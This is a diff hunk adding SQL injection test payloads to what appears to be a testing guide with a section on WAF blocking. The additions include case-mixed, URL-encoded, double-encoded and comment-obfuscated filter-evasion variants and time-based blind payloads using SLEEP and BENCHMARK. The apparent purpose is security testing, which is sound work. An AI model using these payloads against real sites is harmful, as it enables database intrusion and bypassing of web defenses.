@@ -140,6 +140,16 @@ If you need further help with setting up these tests or analyzing responses, fee
 ' OR 1=1 --
 ' AND 1=1 --
 ' OR '1'='1' --
+' Or '1'='1' --
+' oR '1'='1' --
+%27%20OR%20%271%27%3D%271%27%20--
+%2527%2520OR%25201%253D1%2520--
+'/*comment*/OR/*comment*/'1'='1'--
+' OR '1'='1' AND 'a'+'b'='ab'--
+' AND 1=1 --
+' || '1'='1' --
+' OR IF(1=1, SLEEP(5), 0)--
+' OR BENCHMARK(1000000, MD5('test'))--
 
 
 # WAF Blocking Your Tests?
